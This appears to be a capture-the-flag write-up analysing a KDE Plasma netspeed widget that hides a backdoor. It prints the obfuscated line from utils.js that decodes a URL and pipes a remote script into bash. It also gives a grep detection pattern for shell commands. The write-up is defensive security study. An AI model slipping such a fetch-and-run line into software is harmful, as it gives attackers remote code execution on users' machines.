
```markdown
# 🧾 KDE Plasma Plasmoid Backdoor Analysis

## 📁 Challenge Overview

We were provided with a ZIP archive containing KDE Plasma customization files:

- `look-and-feel/`: Global theme configurations
- `plasmoids/`: User-installed widgets
- `desktoptheme/`: Visual styling elements

Our task was to enumerate the contents and identify any potentially malicious behavior. This stems from a real-world incident where a KDE Global Theme caused a user's `$HOME` directory to be deleted.

---

## 🔍 Enumeration & Analysis

Navigating to:

```

plasmoids/org.kde.netspeedWidget/contents/code/utils.js

````

We discovered this suspicious line:

```js
const PLASMOID_UPDATE_SOURCE = 
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
````

### 📖 Deobfuscation Steps

This line performs the following:

1. **Reverses** the string with `rev`
2. **Base64-decodes** the reversed string
3. Assigns it to `UPDATE_URL`
4. Uses `curl` to fetch a remote script
5. Pipes it directly into `bash`

#### Effectively:

```bash
curl <decoded-url>:1992/update_sh | bash
```

This allows **arbitrary code execution** from an **obfuscated remote source**.

---

## 🚨 Why This Is Dangerous

Although the rest of the code monitors network usage by reading `/proc/net/dev`, this injected line:

* Downloads & runs external scripts silently
* Uses obfuscation (`rev | base64 -d`) to avoid detection
* Could easily execute destructive commands (like `rm -rf ~`)

---

## 🧠 Real Risk

Plasmoids in KDE are allowed to execute shell commands by design.

This makes them:

* Functional for system monitoring
* Vulnerable to abuse when sourced from untrusted developers

Whether this was an intentional backdoor or a versioning error, it exposes users to:

* **File deletion**
* **Data exfiltration**
* **Persistent backdoors**

---

## ✅ Conclusion

We identified a KDE Plasma widget that behaves like a **Trojan horse**:

* Masks as a network speed widget
* Executes a hidden, remote shell script

This demonstrates the **critical need for auditing themes/widgets**, especially in environments that allow shell command execution.

---

## 🔐 Recommendations

* **Avoid untrusted plasmoids/themes**
* Audit for shell command patterns like `curl`, `bash`, `wget`, `rm`
* KDE should implement:

  * Sandbox execution
  * Digital signing & verification of themes
  * User warnings for shell command usage

---

## 🛠️ Bonus: Quick Scan Command

To detect dangerous patterns inside a plasmoid/theme folder:

```bash
grep -RiE "curl|bash|wget|rm -rf|base64|rev" ./plasmoids/
```

---

## 🧪 Sample Safe Output (Expected Widget Function)

```js
const NET_DATA_SOURCE =
  "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";
```

This safely fetches upload/download data from `/proc/net/dev`.

---
